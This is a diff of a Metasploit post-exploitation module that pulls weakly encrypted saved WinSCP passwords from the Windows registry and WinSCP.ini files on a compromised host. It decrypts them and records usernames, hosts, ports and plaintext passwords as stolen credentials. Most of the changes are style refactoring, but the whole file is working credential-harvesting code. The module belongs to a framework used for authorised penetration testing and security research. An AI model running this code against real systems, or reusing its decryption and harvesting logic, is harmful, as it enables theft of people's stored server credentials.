@@ -3,10 +3,6 @@
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-require 'rex/parser/ini'
-require 'rex/parser/winscp'
-require 'msf/core/auxiliary/report'
-
 class MetasploitModule < Msf::Post
   include Msf::Post::Windows::Registry
   include Msf::Auxiliary::Report
@@ -14,33 +10,44 @@ class MetasploitModule < Msf::Post
   include Msf::Post::File
   include Rex::Parser::WinSCP
 
-  def initialize(info={})
-    super(update_info(info,
-      'Name'          => 'Windows Gather WinSCP Saved Password Extraction',
-      'Description'   => %q{
-        This module extracts weakly encrypted saved passwords from
-        WinSCP. It searches for saved sessions in the Windows Registry
-        and the WinSCP.ini file. It cannot decrypt passwords if a master
-        password is used.
+  def initialize(info = {})
+    super(
+      update_info(
+        info,
+        'Name' => 'Windows Gather WinSCP Saved Password Extraction',
+        'Description' => %q{
+          This module extracts weakly encrypted saved passwords from
+          WinSCP. It searches for saved sessions in the Windows Registry
+          and the WinSCP.ini file. It cannot decrypt passwords if a master
+          password is used.
         },
-      'License'       => MSF_LICENSE,
-      'Author'        => [ 'theLightCosine'],
-      'Platform'      => [ 'win' ],
-      'SessionTypes'  => [ 'meterpreter' ]
-    ))
+        'License' => MSF_LICENSE,
+        'Author' => [ 'theLightCosine'],
+        'Platform' => [ 'win' ],
+        'SessionTypes' => [ 'meterpreter' ],
+        'Compat' => {
+          'Meterpreter' => {
+            'Commands' => %w[
+              stdapi_net_resolve_host
+            ]
+          }
+        }
+      )
+    )
   end
 
   def get_reg
     # Enumerate all the SID in HKEY_Users and see if any of them have WinSCP RegistryKeys.
     regexists = 0
 
-    userhives=load_missing_hives()
+    userhives = load_missing_hives
     userhives.each do |hive|
-      next if hive['HKU'] == nil
+      next if hive['HKU'].nil?
+
       master_key = "#{hive['HKU']}\\Software\\Martin Prikryl\\WinSCP 2\\Configuration\\Security"
       masterpw = registry_getvaldata(master_key, 'UseMasterPassword')
 
-      #No WinSCP Keys here
+      # No WinSCP Keys here
       next if masterpw.nil?
 
       regexists = 1
@@ -55,27 +62,28 @@ class MetasploitModule < Msf::Post
         session_key = "#{hive['HKU']}\\Software\\Martin Prikryl\\WinSCP 2\\Sessions"
         saved_sessions = registry_enumkeys(session_key)
         next if saved_sessions.nil?
+
         saved_sessions.each do |saved_session|
           # Skip default settings entry
-          next if saved_session == "Default%20Settings"
+          next if saved_session == 'Default%20Settings'
 
           active_session = "#{hive['HKU']}\\Software\\Martin Prikryl\\WinSCP 2\\Sessions\\#{saved_session}"
           password = registry_getvaldata(active_session, 'Password')
           # There is no password saved for this session, so we skip it
-          next if password == nil
+          next if password.nil?
 
           savedpwds = 1
           portnum = registry_getvaldata(active_session, 'PortNumber')
-          if portnum == nil
+          if portnum.nil?
             # If no explicit port number entry exists, it is set to default port of tcp22
             portnum = 22
           end
 
           encrypted_password = password
-          user = registry_getvaldata(active_session, 'UserName') || ""
-          fsprotocol = registry_getvaldata(active_session, 'FSProtocol') || ""
+          user = registry_getvaldata(active_session, 'UserName') || ''
+          fsprotocol = registry_getvaldata(active_session, 'FSProtocol') || ''
           sname = parse_protocol(fsprotocol)
-          host = registry_getvaldata(active_session, 'HostName') || ""
+          host = registry_getvaldata(active_session, 'HostName') || ''
 
           plaintext = decrypt_password(encrypted_password, "#{user}#{host}")
 
@@ -89,20 +97,19 @@ class MetasploitModule < Msf::Post
         end
 
         if savedpwds == 0
-          print_status("No Saved Passwords found in the Session Registry Keys")
+          print_status('No Saved Passwords found in the Session Registry Keys')
         end
       end
     end
 
     if regexists == 0
-      print_status("No WinSCP Registry Keys found!")
+      print_status('No WinSCP Registry Keys found!')
     end
     unload_our_hives(userhives)
-
   end
 
   def run
-    print_status("Looking for WinSCP.ini file storage...")
+    print_status('Looking for WinSCP.ini file storage...')
 
     # WinSCP is only x86...
     if sysinfo['Architecture'] == 'x86'
@@ -121,11 +128,12 @@ class MetasploitModule < Msf::Post
     end
 
     user_dir = "#{env['APPDATA']}\\..\\.."
-    user_dir << "\\.." if user_dir.include?('Users')
+    user_dir << '\\..' if user_dir.include?('Users')
 
     users = dir(user_dir)
     users.each do |user|
-      next if user == "." || user == ".."
+      next if user == '.' || user == '..'
+
       app_data = "#{env['APPDATA'].gsub(env['USERNAME'], user)}\\WinSCP.ini"
       vprint_status("Looking for #{app_data}...")
       get_ini(app_data) if file?(app_data)
@@ -135,7 +143,7 @@ class MetasploitModule < Msf::Post
 
     get_ini(program_files) if file?(program_files)
 
-    print_status("Looking for Registry storage...")
+    print_status('Looking for Registry storage...')
     get_reg
   end
 
@@ -166,13 +174,13 @@ class MetasploitModule < Msf::Post
       port: config[:portnumber],
       service_name: config[:protocol],
       protocol: 'tcp',
-      workspace_id: myworkspace_id,
+      workspace_id: myworkspace_id
     }
 
     credential_data = {
       origin_type: :session,
       session_id: session_db_id,
-      post_reference_name: self.refname,
+      post_reference_name: refname,
       private_type: :password,
       private_data: config[:password],
       username: config[:username]
